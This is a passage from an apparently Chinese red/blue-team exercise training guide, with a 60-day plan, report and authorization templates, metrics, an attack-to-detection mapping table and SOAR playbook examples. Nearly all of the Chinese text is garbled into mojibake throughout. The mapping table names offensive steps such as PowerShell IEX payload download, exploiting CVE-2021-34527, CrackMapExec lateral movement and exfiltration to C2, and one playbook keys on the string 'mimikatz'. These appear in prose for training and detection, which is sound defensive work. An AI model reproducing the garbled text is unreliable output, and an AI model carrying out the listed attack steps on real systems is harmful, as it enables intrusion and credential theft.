<li><strong>å†…éƒ¨å½±å“åŠ›</strong>ï¼šå®šæœŸåˆ†äº«æŠ€æœ¯æˆæœã€ç»„ç»‡æ”»é˜²æ¼”ç»ƒåŸ¹è®­ã€ç¼–å†™å·¥å…·æ–‡æ¡£ã€‚</li>
<li><strong>è¡Œä¸šå½±å“åŠ›</strong>ï¼šæŠ•ç¨¿å®‰å…¨å³°ä¼šã€å¼€æºå·¥å…·ã€æ’°å†™ç™½çš®ä¹¦ã€å‚ä¸æ ‡å‡†åˆ¶å®šã€‚</li>
<li><strong>å•†ä¸šä»·å€¼</strong>ï¼šå¸®åŠ©ä¼ä¸šæ­å»ºå®‰å…¨äº§å“åŸå‹ã€è¯„ä¼°å®‰å…¨æŠ•èµ„ROIã€å¯¹æ¥å®¢æˆ·éœ€æ±‚ã€‚</li>
<li><strong>ä¸ªäººå“ç‰Œ</strong>ï¼šç»´æŠ¤æŠ€æœ¯åšå®¢ã€è¿è¥ç¤¾äº¤åª’ä½“ã€å‚åŠ æ’­å®¢/ç›´æ’­ã€‚</li>
</ol>
<h3 id="é¢è¯•ä¸æ™‹å‡å‡†å¤‡"><a class="header" href="#é¢è¯•ä¸æ™‹å‡å‡†å¤‡">é¢è¯•ä¸æ™‹å‡å‡†å¤‡</a></h3>
<ul>
<li><strong>çº¢é˜Ÿ</strong>ï¼šå±•ç¤ºå®Œæ•´æ”»å‡»é“¾æ¡ˆä¾‹ã€ä»£ç è¯„å®¡ã€æŠ—æ£€æµ‹ç­–ç•¥ã€ä½œæˆ˜æ‰‹å†Œã€‚</li>
<li><strong>è“é˜Ÿ</strong>ï¼šå‘ˆç°æ£€æµ‹è§„åˆ™åº“ã€å‘Šè­¦é™å™ªã€å…¸å‹äº‹ä»¶å“åº”æµç¨‹ã€SOARå‰§æœ¬ã€‚</li>
<li><strong>ç´«é˜Ÿ/æ¶æ„</strong>ï¼šæ¼”ç¤ºæŒ‡æ ‡çœ‹æ¿ã€æ”»é˜²ååŒæµç¨‹ã€ç»„ç»‡æ²»ç†æ¡ˆä¾‹ã€è·¨éƒ¨é—¨æ²Ÿé€šèƒ½åŠ›ã€‚</li>
<li><strong>é€šç”¨</strong>ï¼šSTARæ³•åˆ™æè¿°é—®é¢˜ä¸æˆæ•ˆï¼Œå‡†å¤‡é‡åŒ–æŒ‡æ ‡ï¼ˆMTTD/MTTRã€è¦†ç›–ç‡ã€èŠ‚çº¦æˆæœ¬ï¼‰ã€‚</li>
</ul>
<hr />
<hr />
<h2 id="æ¨¡å—å60å¤©å¼ºåŒ–è®­ç»ƒè®¡åˆ’"><a class="header" href="#æ¨¡å—å60å¤©å¼ºåŒ–è®­ç»ƒè®¡åˆ’">æ¨¡å—åï¼š60å¤©å¼ºåŒ–è®­ç»ƒè®¡åˆ’</a></h2>
<h3 id="æ¨¡å—æ€»è§ˆè®­ç»ƒè§†è§’"><a class="header" href="#æ¨¡å—æ€»è§ˆè®­ç»ƒè§†è§’">æ¨¡å—æ€»è§ˆï¼ˆè®­ç»ƒè§†è§’ï¼‰</a></h3>
<ul>
<li><strong>è®¾è®¡åŸåˆ™</strong>ï¼šä»¥å®æˆ˜ä¸ºä¸­å¿ƒï¼Œå°†çº¢é˜Ÿã€è“é˜Ÿã€ç´«é˜ŸæŠ€èƒ½äº¤æ›¿è®­ç»ƒï¼Œå¼ºè°ƒæˆæœå¯éªŒè¯ä¸é¡¹ç›®åŒ–è¾“å‡ºã€‚</li>
<li><strong>è·¯å¾„ç»“æ„</strong>ï¼šåŸºç¡€ â†’ è¿›é˜¶ â†’ è“é˜Ÿ â†’ å¤ç›˜ â†’ ç»¼åˆ â†’ ä½œå“é›†ã€‚</li>
<li><strong>é…å¥—å·¥å…·</strong>ï¼šå­¦ä¹ å‘¨æŠ¥æ¨¡æ¿ã€OKRçœ‹æ¿ã€æ—¶é—´æŠ•å…¥è¿½è¸ªè¡¨ã€ç»ƒä¹ é¢˜åº“ã€‚</li>
</ul>
<h3 id="ç¬¬1-2å‘¨çº¢é˜ŸåŸºç¡€"><a class="header" href="#ç¬¬1-2å‘¨çº¢é˜ŸåŸºç¡€">ç¬¬1-2å‘¨ï¼šçº¢é˜ŸåŸºç¡€</a></h3>
<p><strong>Day 1-7</strong>:</p>
<ul>
<li>MITRE ATT&amp;CKæ¡†æ¶å­¦ä¹ </li>
<li>Cobalt StrikeåŸºç¡€æ“ä½œ</li>
<li>é’“é±¼æ”»å‡»æŠ€æœ¯</li>
</ul>
<p><strong>Day 8-14</strong>:</p>
<ul>
<li>PowerShellæ”»å‡»æŠ€æœ¯</li>
<li>æƒé™æå‡å®æˆ˜</li>
<li>æ¨ªå‘ç§»åŠ¨ç»ƒä¹ </li>
</ul>
<h3 id="ç¬¬3-4å‘¨çº¢é˜Ÿè¿›é˜¶"><a class="header" href="#ç¬¬3-4å‘¨çº¢é˜Ÿè¿›é˜¶">ç¬¬3-4å‘¨ï¼šçº¢é˜Ÿè¿›é˜¶</a></h3>
<p><strong>Day 15-21</strong>:</p>
<ul>
<li>C2é€šä¿¡éšè”½åŒ–</li>
<li>é˜²å¾¡è§„é¿æŠ€æœ¯</li>
<li>è‡ªå®šä¹‰å·¥å…·å¼€å‘</li>
</ul>
<p><strong>Day 22-28</strong>:</p>
<ul>
<li>å®Œæˆ5å°å†…ç½‘é¶æœº</li>
<li>æ¨¡æ‹ŸAPTæ”»å‡»é“¾</li>
<li>çº¢é˜ŸæŠ¥å‘Šç¼–å†™</li>
</ul>
<h3 id="ç¬¬5-6å‘¨è“é˜ŸåŸºç¡€"><a class="header" href="#ç¬¬5-6å‘¨è“é˜ŸåŸºç¡€">ç¬¬5-6å‘¨ï¼šè“é˜ŸåŸºç¡€</a></h3>
<p><strong>Day 29-35</strong>:</p>
<ul>
<li>SIEMç³»ç»Ÿéƒ¨ç½²</li>
<li>æ—¥å¿—åˆ†ææŠ€æœ¯</li>
<li>æ£€æµ‹è§„åˆ™ç¼–å†™</li>
</ul>
<p><strong>Day 36-42</strong>:</p>
<ul>
<li>å¨èƒç‹©çŒå®è·µ</li>
<li>åº”æ€¥å“åº”æ¼”ç»ƒ</li>
<li>å–è¯åˆ†æåŸºç¡€</li>
</ul>
<h3 id="ç¬¬7-8å‘¨è“é˜Ÿè¿›é˜¶"><a class="header" href="#ç¬¬7-8å‘¨è“é˜Ÿè¿›é˜¶">ç¬¬7-8å‘¨ï¼šè“é˜Ÿè¿›é˜¶</a></h3>
<p><strong>Day 43-49</strong>:</p>
<ul>
<li>é«˜çº§å¨èƒæ£€æµ‹</li>
<li>å†…å­˜å–è¯åˆ†æ</li>
<li>æ¶æ„è½¯ä»¶åˆ†æ</li>
</ul>
<p><strong>Day 50-56</strong>:</p>
<ul>
<li>å®Œæ•´äº‹ä»¶å“åº”</li>
<li>SOCæµç¨‹ä¼˜åŒ–</li>
<li>è“é˜ŸæŠ¥å‘Šç¼–å†™</li>
</ul>
<h3 id="ç¬¬9-10å‘¨ç»¼åˆå®æˆ˜"><a class="header" href="#ç¬¬9-10å‘¨ç»¼åˆå®æˆ˜">ç¬¬9-10å‘¨ï¼šç»¼åˆå®æˆ˜</a></h3>
<p><strong>Day 57-60</strong>:</p>
<ul>
<li>çº¢è“å¯¹æŠ—æ¼”ç»ƒ</li>
<li>ç´«é˜ŸååŒä¼˜åŒ–</li>
<li>æ€»ç»“ä¸å¤ç›˜</li>
</ul>
<hr />
<h3 id="å­¦ä¹ å‘¨æŠ¥æ¨¡æ¿"><a class="header" href="#å­¦ä¹ å‘¨æŠ¥æ¨¡æ¿">å­¦ä¹ å‘¨æŠ¥æ¨¡æ¿</a></h3>
<pre><code class="language-markdown">## å‘¨æŠ¥å‘¨æœŸï¼š2024-W15

### æœ¬å‘¨ç›®æ ‡è¾¾æˆæƒ…å†µ
- [x] å®Œæˆ3ä¸ªAtomic Red Teamåœºæ™¯å¤ç°
- [x] æ–°å¢2æ¡Sigmaè§„åˆ™å¹¶éªŒè¯
- [ ] å®ŒæˆCloudGoatåœºæ™¯ï¼ˆå»¶æœŸï¼šç¼ºå°‘AWSè´¦å·ï¼‰

### å…³é”®æˆæœä¸äº§å‡º
- Red Teamï¼šå®Œæˆé’“é±¼â†’å†…ç½‘â†’æ•°æ®æ¸—å‡ºçš„å®Œæ•´é“¾è·¯å¤ç›˜æ–‡æ¡£
- Blue Teamï¼šä¸Šçº¿`PS_EncodedCommand`æ£€æµ‹è§„åˆ™ï¼Œè¯¯æŠ¥ç‡ä¸‹é™30%
- Purple Teamï¼šæ›´æ–°è”åŠ¨çœ‹æ¿ï¼Œæ–°å¢4ä¸ªè¡ŒåŠ¨é¡¹

### é—®é¢˜ä¸é˜»å¡
- ç¼ºå°‘ç”Ÿäº§ç¯å¢ƒæµé‡æ ·æœ¬ï¼Œè®¡åˆ’ä¸ç½‘ç»œå›¢é˜Ÿåè°ƒ
- EDRç­–ç•¥æ›´æ–°å®¡æ‰¹æµç¨‹è¾ƒé•¿ï¼Œå»ºè®®ä¸å®‰å…¨ç­–ç•¥å›¢é˜ŸåŒæ­¥ä¼˜åŒ–

### ä¸‹å‘¨è®¡åˆ’
- å®ŒæˆCloudGoatåœºæ™¯å¹¶è¾“å‡ºå¤ç›˜
- ç¼–å†™SOARå‰§æœ¬ï¼šéš”ç¦»å¯ç–‘ä¸»æœº + è·å–å†…å­˜é•œåƒ
- å‚åŠ å†…éƒ¨åˆ†äº«ã€Šæ¼”ç»ƒæŒ‡æ ‡è®¾è®¡å®æˆ˜ã€‹

### éœ€è¦çš„æ”¯æŒ
- ç”³è¯·æµ‹è¯•ç½‘æ®µå¼€æ”¾Outboundç«¯å£ 80/443/8080
- å®‰æ’ä¸€æ¬¡ä¸ä¸šåŠ¡è´Ÿè´£äººäº¤æµä¼šè®®ï¼ˆæ¼”ç»ƒå½±å“è¯„ä¼°ï¼‰
</code></pre>
<h3 id="æ—¶é—´æŠ•å…¥è¿½è¸ªè¡¨ç¤ºä¾‹"><a class="header" href="#æ—¶é—´æŠ•å…¥è¿½è¸ªè¡¨ç¤ºä¾‹">æ—¶é—´æŠ•å…¥è¿½è¸ªè¡¨ï¼ˆç¤ºä¾‹ï¼‰</a></h3>
<div class="table-wrapper"><table><thead><tr><th>æ—¥æœŸ</th><th>æ¨¡å—</th><th>æ´»åŠ¨</th><th>æ—¶é•¿(h)</th><th>å¤‡æ³¨</th></tr></thead><tbody>
<tr><td>2024-04-01</td><td>çº¢é˜Ÿ</td><td>ATT&amp;CK Reconç»ƒä¹ </td><td>2.5</td><td>å®Œæˆ3ä¸ªå­åŸŸåœºæ™¯</td></tr>
<tr><td>2024-04-02</td><td>çº¢é˜Ÿ</td><td>C2ç¯å¢ƒéƒ¨ç½²</td><td>3</td><td>Ansibleè‡ªåŠ¨åŒ–æˆåŠŸ</td></tr>
<tr><td>2024-04-03</td><td>è“é˜Ÿ</td><td>SIEMè§„åˆ™è°ƒè¯•</td><td>2</td><td>å‘½ä¸­ç‡æå‡</td></tr>
<tr><td>2024-04-04</td><td>è“é˜Ÿ</td><td>Threat Hunting</td><td>2.5</td><td>å‘ç°å¼‚å¸¸RDPè¡Œä¸º</td></tr>
<tr><td>2024-04-05</td><td>ç´«é˜Ÿ</td><td>è”åŠ¨ä¼šè®®ä¸å¤ç›˜</td><td>1.5</td><td>å½¢æˆ5ä¸ªè¡ŒåŠ¨é¡¹</td></tr>
</tbody></table>
</div>
<blockquote>
<p>å»ºè®®ä½¿ç”¨Notion/Obsidian/Excelç»´æŠ¤å­¦ä¹ è½¨è¿¹ï¼Œå½¢æˆå¯å¤ç”¨æ¡ˆä¾‹åº“ã€‚</p>
</blockquote>
<hr />
<h2 id="-å®‰å…¨æé†’"><a class="header" href="#-å®‰å…¨æé†’">âš ï¸ å®‰å…¨æé†’</a></h2>
<ol>
<li><strong>åˆæ³•æˆæƒ</strong>: æ‰€æœ‰æ´»åŠ¨å¿…é¡»è·å¾—ä¹¦é¢æˆæƒ</li>
<li><strong>ä¿å¯†ä¹‰åŠ¡</strong>: ä¸¥æ ¼ä¿æŠ¤æ¼”ç»ƒä¿¡æ¯å’Œå‘ç°</li>
<li><strong>æœ€å°å½±å“</strong>: é¿å…å½±å“ä¸šåŠ¡æ­£å¸¸è¿è¡Œ</li>
<li><strong>åŠæ—¶æ²Ÿé€š</strong>: å‘ç°é‡å¤§é—®é¢˜ç«‹å³æŠ¥å‘Š</li>
<li><strong>æŒç»­å­¦ä¹ </strong>: æ”»é˜²æŠ€æœ¯ä¸æ–­æ¼”è¿›</li>
</ol>
<hr />
<h2 id="é™„å½•aæ¼”ç»ƒæ ¸å¿ƒæ–‡æ¡£æ¨¡æ¿"><a class="header" href="#é™„å½•aæ¼”ç»ƒæ ¸å¿ƒæ–‡æ¡£æ¨¡æ¿">é™„å½•Aï¼šæ¼”ç»ƒæ ¸å¿ƒæ–‡æ¡£æ¨¡æ¿</a></h2>
<h3 id="a1-æˆæƒä¸æ²Ÿé€šæ¨¡æ¿"><a class="header" href="#a1-æˆæƒä¸æ²Ÿé€šæ¨¡æ¿">A.1 æˆæƒä¸æ²Ÿé€šæ¨¡æ¿</a></h3>
<pre><code class="language-markdown"># çº¢è“å¯¹æŠ—æˆæƒä¹¦
- é¡¹ç›®åç§°ï¼š&lt;å¡«å†™&gt;
- æ¼”ç»ƒæ—¶é—´ï¼š&lt;å¼€å§‹æ—¥æœŸ&gt; è‡³ &lt;ç»“æŸæ—¥æœŸ&gt;
- æ¼”ç»ƒèŒƒå›´ï¼š&lt;ç³»ç»Ÿ/ç½‘æ®µ/èµ„äº§åˆ—è¡¨&gt;
- æ’é™¤èŒƒå›´ï¼š&lt;ç¦æ­¢æ”»å‡»çš„ç³»ç»Ÿæˆ–ä¸šåŠ¡&gt;
- è´£ä»»åˆ†å·¥ï¼šçº¢é˜Ÿ/è“é˜Ÿ/ç™½é˜Ÿ/ç´«é˜Ÿè”ç³»äººã€ç”µè¯ã€å€¼ç­æ—¶é—´
- å®‰å…¨é™åˆ¶ï¼šç¦æ­¢DoSã€ç¦æ­¢åˆ é™¤æ•°æ®ã€ç¦æ­¢å½±å“ç”Ÿäº§ã€è§¦å‘L2/L3é¡»æš‚åœ
- è¯æ®è¦æ±‚ï¼šçº¢é˜Ÿé¡»ä¿ç•™å‘½ä»¤ã€æ—¥å¿—ï¼›è“é˜Ÿé¡»ä¿ç•™å‘Šè­¦ã€å“åº”è®°å½•ï¼›ç™½é˜Ÿç»Ÿä¸€å½’æ¡£
- æ³•åŠ¡æ¡æ¬¾ï¼šä¿å¯†åè®®ã€è´£ä»»èŒƒå›´ã€æ•°æ®å¤„ç†è¦æ±‚ã€å›æ»šè´£ä»»
- ç­¾ç½²ï¼šç”²æ–¹/ä¹™æ–¹/è§è¯äºº
</code></pre>
<h3 id="a2-æ¼”ç»ƒè®¡åˆ’æ¨¡æ¿"><a class="header" href="#a2-æ¼”ç»ƒè®¡åˆ’æ¨¡æ¿">A.2 æ¼”ç»ƒè®¡åˆ’æ¨¡æ¿</a></h3>
<pre><code class="language-markdown"># æ¼”ç»ƒè®¡åˆ’ä¹¦
1. ç›®æ ‡ä¸æˆåŠŸæ ‡å‡†
2. æ¼”ç»ƒèŒƒå›´ä¸æ’é™¤é¡¹
3. å…³é”®èµ„äº§ä¼˜å…ˆçº§åˆ—è¡¨
4. æ—¶é—´çº¿ä¸é‡Œç¨‹ç¢‘ï¼ˆå«æ¯æ—¥ä¾‹ä¼šå®‰æ’ï¼‰
5. äººå‘˜ä¸èŒè´£ï¼ˆRACIçŸ©é˜µï¼‰
6. å·¥å…·ä¸ç¯å¢ƒå‡†å¤‡ï¼ˆC2ã€SIEMã€SOARã€é¶åœºï¼‰
7. æ²Ÿé€šä¸å‡çº§æµç¨‹
8. é£é™©è¯„ä¼°ä¸ä¸­æ­¢æ¡ä»¶
9. è¯æ®ä¸æ—¥å¿—ç®¡ç†ç­–ç•¥
10. æ¼”ç»ƒæŒ‡æ ‡ï¼ˆæ£€æµ‹ã€å“åº”ã€æ”¹è¿›ï¼‰
</code></pre>
<h3 id="a3-æ—¥æŠ¥æ¨¡æ¿"><a class="header" href="#a3-æ—¥æŠ¥æ¨¡æ¿">A.3 æ—¥æŠ¥æ¨¡æ¿</a></h3>
<pre><code class="language-markdown"># çº¢è“å¯¹æŠ—æ—¥æŠ¥ - &lt;æ—¥æœŸ&gt;
## 1. çº¢é˜Ÿè¡ŒåŠ¨æ‘˜è¦
- ä¾¦å¯Ÿï¼š&lt;æè¿°&gt;
- åˆ©ç”¨ï¼š&lt;æè¿°&gt;
- æ¨ªå‘ï¼š&lt;æè¿°&gt;
- æ•°æ®è®¿é—®ï¼š&lt;æè¿°&gt;

## 2. è“é˜Ÿæ£€æµ‹ä¸å“åº”
- å‘Šè­¦æ•°é‡ï¼š&lt;æ€»æ•°&gt;ï¼ˆé«˜/ä¸­/ä½ï¼‰
- å…³é”®æ£€æµ‹ï¼š&lt;è§„åˆ™åç§°/æ—¶é—´/å¤„ç†äºº&gt;
- å“åº”æªæ–½ï¼š&lt;éš”ç¦»/é˜»æ–­/å–è¯&gt;

## 3. é£é™©è¯„ä¼°
- å½±å“èµ„äº§ï¼š&lt;åˆ—è¡¨&gt;
- å½±å“ç­‰çº§ï¼š&lt;L0/L1/L2/L3&gt;
- æ˜¯å¦è§¦å‘å‡çº§ï¼š&lt;æ˜¯/å¦&gt;

## 4. é—®é¢˜ä¸è¡ŒåŠ¨é¡¹
- é—®é¢˜ï¼š&lt;æè¿° / è´£ä»»äºº / æˆªæ­¢æ—¶é—´&gt;
- è¡ŒåŠ¨é¡¹ï¼š&lt;æè¿° / è´£ä»»äºº / æˆªæ­¢æ—¶é—´&gt;
</code></pre>
<h3 id="a4-æ¼”ç»ƒå¤ç›˜æŠ¥å‘Šæ¨¡æ¿"><a class="header" href="#a4-æ¼”ç»ƒå¤ç›˜æŠ¥å‘Šæ¨¡æ¿">A.4 æ¼”ç»ƒå¤ç›˜æŠ¥å‘Šæ¨¡æ¿</a></h3>
<pre><code class="language-markdown"># çº¢è“å¯¹æŠ—å¤ç›˜æŠ¥å‘Š
1. æ¼”ç»ƒæ¦‚è§ˆï¼šç›®æ ‡ã€èŒƒå›´ã€æ—¶é—´ã€å›¢é˜Ÿã€æŒ‡æ ‡è¾¾æˆæƒ…å†µ
2. æ”»å‡»é“¾å›é¡¾ï¼šå…³é”®é˜¶æ®µã€æˆåŠŸ/å¤±è´¥ã€è¯æ®ç´¢å¼•
3. æ£€æµ‹ä¸å“åº”è¡¨ç°ï¼šMTTDã€MTTRã€è¯¯æŠ¥/æ¼æŠ¥ç»Ÿè®¡
4. å…³é”®å‘ç°ï¼šæŒ‰ç…§é£é™©ç­‰çº§åˆ—å‡ºé—®é¢˜ã€å½±å“ã€å»ºè®®
5. æŒ‡æ ‡åˆ†æï¼šæ£€æµ‹è¦†ç›–ç‡ã€è¡ŒåŠ¨é¡¹å®Œæˆæƒ…å†µã€æ”¹è¿›å»ºè®®
6. çŸ¥è¯†æ²‰æ·€ï¼šæ£€æµ‹è§„åˆ™ã€å‰§æœ¬æ›´æ–°ã€å·¥å…·æ”¹è¿›ã€åŸ¹è®­éœ€æ±‚
7. åç»­è®¡åˆ’ï¼šæ”¹è¿›è¡ŒåŠ¨é¡¹åˆ—è¡¨ã€å¤æµ‹è®¡åˆ’ã€é•¿æœŸå»ºè®¾ä¸»é¢˜
</code></pre>
<hr />
<h2 id="é™„å½•bå¯¹æŠ—æŒ‡æ ‡è¯å…¸"><a class="header" href="#é™„å½•bå¯¹æŠ—æŒ‡æ ‡è¯å…¸">é™„å½•Bï¼šå¯¹æŠ—æŒ‡æ ‡è¯å…¸</a></h2>
<div class="table-wrapper"><table><thead><tr><th>æŒ‡æ ‡</th><th>æè¿°</th><th>è®¡ç®—æ–¹æ³•</th><th>å…³æ³¨å›¢é˜Ÿ</th><th>å¤‡æ³¨</th></tr></thead><tbody>
<tr><td>MTTD</td><td>å¹³å‡æ£€æµ‹æ—¶é—´</td><td>(å‘Šè­¦æ—¶é—´-æ”»å‡»å¼€å§‹æ—¶é—´) å¹³å‡å€¼</td><td>è“é˜Ÿ</td><td>é«˜ä»·å€¼èµ„äº§å•ç‹¬ç»Ÿè®¡</td></tr>
<tr><td>MTTR</td><td>å¹³å‡å“åº”æ—¶é—´</td><td>(é‡‡å–æªæ–½æ—¶é—´-å‘Šè­¦æ—¶é—´) å¹³å‡å€¼</td><td>è“é˜Ÿ/ç´«é˜Ÿ</td><td>åŒºåˆ†åˆæ­¥å“åº”ä¸å®Œå…¨ä¿®å¤</td></tr>
<tr><td>Coverage</td><td>æ£€æµ‹è¦†ç›–ç‡</td><td>å‘½ä¸­çš„ATT&amp;CKæŠ€æœ¯æ•° / æ€»æŠ€æœ¯æ•°</td><td>è“é˜Ÿ</td><td>ç»“åˆåœºæ™¯æƒé‡</td></tr>
<tr><td>SuccessRate</td><td>çº¢é˜Ÿä»»åŠ¡æˆåŠŸç‡</td><td>å®Œæˆä»»åŠ¡æ•° / æ€»ä»»åŠ¡æ•°</td><td>çº¢é˜Ÿ</td><td>åŒ…å«éšè”½æ€§è¯„åˆ†</td></tr>
<tr><td>ClosureRate</td><td>è¡ŒåŠ¨é¡¹å…³é—­ç‡</td><td>å·²å…³é—­è¡ŒåŠ¨é¡¹ / æ€»è¡ŒåŠ¨é¡¹</td><td>ç™½é˜Ÿ/ç´«é˜Ÿ</td><td>30å¤©å†…è¿½è¸ª</td></tr>
<tr><td>Automation</td><td>è‡ªåŠ¨åŒ–è¦†ç›–ç‡</td><td>è‡ªåŠ¨åŒ–æ‰§è¡Œæ­¥éª¤ / æ€»æ­¥éª¤</td><td>è“é˜Ÿ/ç´«é˜Ÿ</td><td>åŒ…å«SOARã€è„šæœ¬</td></tr>
</tbody></table>
</div>
<hr />
<h2 id="é™„å½•cå¸¸è§æ”»å‡»æ£€æµ‹æ˜ å°„è¡¨"><a class="header" href="#é™„å½•cå¸¸è§æ”»å‡»æ£€æµ‹æ˜ å°„è¡¨">é™„å½•Cï¼šå¸¸è§æ”»å‡»æ£€æµ‹æ˜ å°„è¡¨</a></h2>
<div class="table-wrapper"><table><thead><tr><th>æ”»å‡»é˜¶æ®µ</th><th>MITREæŠ€æœ¯</th><th>çº¢é˜Ÿæ“ä½œç¤ºä¾‹</th><th>é¢„æœŸæ—¥å¿—/æ•°æ®æº</th><th>æ£€æµ‹å»ºè®®</th><th>åº”æ€¥åŠ¨ä½œ</th></tr></thead><tbody>
<tr><td>Initial Access</td><td>T1566 é’“é±¼</td><td>Gophishå‘é€å‡­è¯é’“é±¼</td><td>é‚®ä»¶ç½‘å…³ã€ä»£ç†æ—¥å¿—</td><td>å…³é”®è¯è¿‡æ»¤ã€é“¾æ¥ä¿¡èª‰</td><td>é˜»æ–­é“¾æ¥ã€é€šçŸ¥å—å®³è€…</td></tr>
<tr><td>Execution</td><td>T1059 PowerShell</td><td>IEXä¸‹è½½æ‰§è¡Œpayload</td><td>EventID 4104ã€Sysmon 1</td><td>Base64æ£€æµ‹ã€å…³é”®å‡½æ•°ç›‘æ§</td><td>éš”ç¦»ç»ˆç«¯ã€å–è¯å†…å­˜</td></tr>
<tr><td>Persistence</td><td>T1547 Run Key</td><td>æ·»åŠ Runæ³¨å†Œè¡¨é¡¹</td><td>Sysmon 13ã€4688</td><td>æ£€æµ‹Run/RunOnceå˜åŒ–</td><td>æ¸…ç†æŒä¹…åŒ–é¡¹</td></tr>
<tr><td>Privilege Escalation</td><td>T1068 ææƒæ¼æ´</td><td>åˆ©ç”¨CVE-2021-34527</td><td>åº”ç”¨ç¨‹åºæ—¥å¿—ã€ETW</td><td>ç›‘æµ‹å¼‚å¸¸æ‰“å°æœåŠ¡è°ƒç”¨</td><td>æ‰“è¡¥ä¸ã€ç¦ç”¨æœåŠ¡</td></tr>
<tr><td>Lateral Movement</td><td>T1021 SMB/RDP</td><td>CrackMapExecæ¨ªå‘</td><td>4624ã€ç½‘ç»œæµé‡ã€Zeek</td><td>å¤šä¸»æœºç™»å½•ã€å¤±è´¥æ¬¡æ•°</td><td>ç¦æ­¢è´¦æˆ·ç™»å½•ã€é‡ç½®å‡­è¯</td></tr>
<tr><td>Exfiltration</td><td>T1041 ç½‘ç»œæ¸—å‡º</td><td>ä¸Šä¼ æ•°æ®åˆ°C2</td><td>æµé‡æ—¥å¿—ã€ä»£ç†æ—¥å¿—</td><td>æ•°æ®åŒ…å¤§å°ã€åŠ å¯†å¤–è”</td><td>é˜»æ–­å‡ºå£ã€å°ç¦åŸŸå</td></tr>
</tbody></table>
</div>
<hr />
<h2 id="é™„å½•då¸¸è§soarå‰§æœ¬ç¤ºä¾‹"><a class="header" href="#é™„å½•då¸¸è§soarå‰§æœ¬ç¤ºä¾‹">é™„å½•Dï¼šå¸¸è§SOARå‰§æœ¬ç¤ºä¾‹</a></h2>
<div class="table-wrapper"><table><thead><tr><th>å‰§æœ¬åç§°</th><th>è§¦å‘æ¡ä»¶</th><th>è‡ªåŠ¨åŒ–æ­¥éª¤</th><th>äººå·¥å†³ç­–</th><th>è¾“å‡º</th></tr></thead><tbody>
<tr><td><code>PS_EncodedCommand_Response</code></td><td>å‘Šè­¦å‘½ä¸­PowerShell Base64</td><td>æ”¶é›†ä¸»æœºä¿¡æ¯ â†’ æŠ“å–è„šæœ¬ â†’ ä¸Šä¼ EDRéš”ç¦»è¯·æ±‚</td><td>æ˜¯å¦éš”ç¦»ç»ˆç«¯ï¼Ÿ</td><td>å·¥å•ã€å–è¯åŒ…ã€æŠ¥å‘Š</td></tr>
<tr><td><code>Credential_Dump_Response</code></td><td>æ£€æµ‹åˆ°<code>mimikatz</code>å­—æ ·</td><td>æŸ¥è¯¢è¿›ç¨‹ â†’ å¯¼å‡ºå†…å­˜ â†’ é‡ç½®è´¦æˆ·å¯†ç </td><td>åˆ¤æ–­ä¸šåŠ¡å½±å“ä¸éš”ç¦»ç­–ç•¥</td><td>äº‹ä»¶æ—¶é—´çº¿ã€å¯†ç é‡ç½®æ¸…å•</td></tr>
<tr><td><code>Data_Exfiltration_Stop</code></td><td>å‡ºå£æµé‡å¼‚å¸¸</td><td>é˜»æ–­IP/åŸŸå â†’ æå–PCAP â†’ é€šçŸ¥ç½‘ç»œå›¢é˜Ÿ</td><td>æ˜¯å¦è§£é™¤é˜»æ–­ï¼Ÿ</td><td>å–è¯è¯æ®ã€é˜»æ–­è®°å½•</td></tr>
<tr><td><code>Purple_Validation</code></td><td>ç´«é˜Ÿåœºæ™¯éªŒè¯å®Œæˆ</td><td>æ”¶é›†æ”»é˜²æ•°æ® â†’ ç”ŸæˆæŠ¥å‘Š â†’ åˆ›å»ºæ”¹è¿›è¡ŒåŠ¨é¡¹</td><td>ç¡®è®¤è¡ŒåŠ¨é¡¹è´Ÿè´£äºº</td><td>éªŒè¯æŠ¥å‘Šã€è¡ŒåŠ¨é¡¹åˆ—è¡¨</td></tr>
</tbody></table>
</div>
<hr />
<h2 id="é™„å½•eæœ¯è¯­ä¸ç¼©å†™è¡¨"><a class="header" href="#é™„å½•eæœ¯è¯­ä¸ç¼©å†™è¡¨">é™„å½•Eï¼šæœ¯è¯­ä¸ç¼©å†™è¡¨</a></h2>
<div class="table-wrapper"><table><thead><tr><th>ç¼©å†™</th><th>è‹±æ–‡å…¨ç§°</th><th>ä¸­æ–‡å«ä¹‰</th><th>è¯´æ˜</th></tr></thead><tbody>
<tr><td>ATT&amp;CK</td><td>Adversarial Tactics, Techniques &amp; Common Knowledge</td><td>å¯¹æ‰‹æˆ˜æœ¯æŠ€æœ¯çŸ¥è¯†åº“</td><td>æ”»å‡»è€…è¡Œä¸ºæ¨¡å‹</td></tr>
<tr><td>OPSEC</td><td>Operational Security</td><td>è¡ŒåŠ¨å®‰å…¨</td><td>ä¿æŠ¤çº¢é˜Ÿè‡ªèº«å®‰å…¨ä¸éšè”½</td></tr>
<tr><td>TTP</td><td>Tactics, Techniques, Procedures</td><td>æˆ˜æœ¯ã€æŠ€æœ¯ã€æµç¨‹</td><td>æè¿°æ”»å‡»è€…è¡Œä¸ºç»†èŠ‚</td></tr>
<tr><td>SOAR</td><td>Security Orchestration, Automation and Response</td><td>å®‰å…¨ç¼–æ’è‡ªåŠ¨åŒ–å“åº”</td><td>è‡ªåŠ¨åŒ–è”åŠ¨æ£€æµ‹å’Œå“åº”</td></tr>
<tr><td>MTTD</td><td>Mean Time To Detect</td><td>å¹³å‡æ£€æµ‹æ—¶é—´</td><td>è“é˜Ÿæ•ˆç‡æ ¸å¿ƒæŒ‡æ ‡</td></tr>
<tr><td>MTTR</td><td>Mean Time To Respond</td><td>å¹³å‡å“åº”æ—¶é—´</td><td>åæ˜ å“åº”é€Ÿåº¦</td></tr>
<tr><td>D3FEND</td><td>Defensive Countermeasures</td><td>é˜²å¾¡å¯¹ç­–çŸ¥è¯†åº“</td><td>ä¸ATT&amp;CKå¯¹ç…§ä½¿ç”¨</td></tr>
<tr><td>CTI</td><td>Cyber Threat Intelligence</td><td>ç½‘ç»œå¨èƒæƒ…æŠ¥</td><td>é©±åŠ¨æ”»é˜²æ¼”ç»ƒä¸æ£€æµ‹</td></tr>
<tr><td>TTX</td><td>Tabletop Exercise</td><td>æ¡Œé¢æ¼”ç»ƒ</td><td>æ¼”ç»ƒå‰çš„æµç¨‹æ¨æ¼”</td></tr>
<tr><td>IOC</td><td>Indicator of Compromise</td><td>å…¥ä¾µæŒ‡ç¤ºå™¨</td><td>ç”¨äºæ£€æµ‹æ”»å‡»è¿¹è±¡</td></tr>
</tbody></table>
</div>
